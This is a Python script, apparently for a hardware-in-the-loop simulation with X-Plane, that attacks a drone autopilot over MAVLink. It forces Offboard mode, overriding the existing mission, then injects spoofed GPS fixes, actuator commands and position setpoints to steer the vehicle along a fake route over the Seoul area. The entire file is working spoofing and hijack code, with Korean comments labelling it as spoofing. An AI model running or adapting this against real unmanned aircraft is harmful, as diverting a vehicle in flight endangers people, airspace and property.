#!/usr/bin/env python3
import time
import math
from pymavlink import mavutil

# MAVLink 연결 설정 (UDP 14557 포트)
conn = mavutil.mavlink_connection('udp:127.0.0.1:14557')
conn.wait_heartbeat(timeout=10)
print("HITL 연결 성공 – 3초 후 스푸핑 시작")
time.sleep(3)

# Offboard 모드 강제 전환 (기존 미션 무시)
conn.mav.set_mode_send(conn.target_system, mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 6)
time.sleep(0.3)

# 가짜 경로 정의 (여의도 → 송도 이탈)
path = [
    (37.53000, 126.92000, 450),
    (37.51000, 127.08000, 500),
    (37.46000, 127.00000, 550),
    (37.40000, 126.80000, 600),
    (37.35000, 126.60000, 650),
    (37.30000, 126.50000, 700),
]

def spoof(lat, lon, alt, hdg):
    ts = int(time.time() * 1e6) % (2**64 - 1)  # 타임스탬프 범위 제한
    # HIL_GPS 주입 (가짜 GPS)
    conn.mav.hil_gps_send(ts, 3, int(lat*1e7), int(lon*1e7), int(alt*1000), 30, 40, 1200, 0, 0, 0, 10, 0)
    # HIL_ACTUATOR_CONTROLS 주입 (X-Plane 움직임 보장)
    conn.mav.hil_actuator_controls_send(ts, [0,0,0.60,0,0,0,0,0,0,0,0,0,0,0,0,0], 0, -1, 1)
    # setpoint 주입 (Offboard 제어)
    conn.mav.set_position_target_global_int_send(ts // 1000, conn.target_system, conn.target_component,
                                                 mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT, 0b110111111000,
                                                 int(lat*1e7), int(lon*1e7), int(alt), 0,0,0,0,0,0,0, math.radians(hdg))

def recv_feedback():
    msg = conn.recv_match(type='GLOBAL_POSITION_INT', blocking=True, timeout=1)
    if msg:
        print(f"Receive lat: {msg.lat/1e7}, lon: {msg.lon/1e7}, alt: {msg.alt/1000}")

print("스푸핑 시작 – X-Plane 이탈 반영")
for i in range(len(path)-1):
    lat1, lon1, alt1 = path[i]
    lat2, lon2, alt2 = path[i+1]
    steps = 400 if i == 0 else 300
    hdg = math.degrees(math.atan2(lon2-lon1, lat2-lat1))
    for s in range(steps + 1):
        t = s / steps
        lat = lat1 + (lat2-lat1)*t
        lon = lon1 + (lon2-lon1)*t
        alt = alt1 + (alt2-alt1)*t
        spoof(lat, lon, alt, hdg)
        recv_feedback()
        time.sleep(0.1)

print("스푸핑 완료 – 마무리 성공!")  # 마무리 출력 추가